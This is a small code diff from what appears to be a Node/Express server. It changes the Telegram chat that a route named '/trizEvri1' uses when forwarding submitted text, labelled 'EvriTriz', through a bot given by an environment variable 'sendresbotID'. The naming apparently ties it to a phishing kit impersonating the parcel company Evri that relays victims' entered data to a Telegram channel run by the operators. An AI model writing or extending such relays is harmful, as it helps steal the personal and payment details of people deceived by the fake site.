@@ -16577,7 +16577,7 @@ app.post("/trizEvri1", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: "-712431616",
+              chat_id: "-764686477",
               text: `EvriTriz:\n${originalText}`,
               parse_mode: "Markdown",
             }
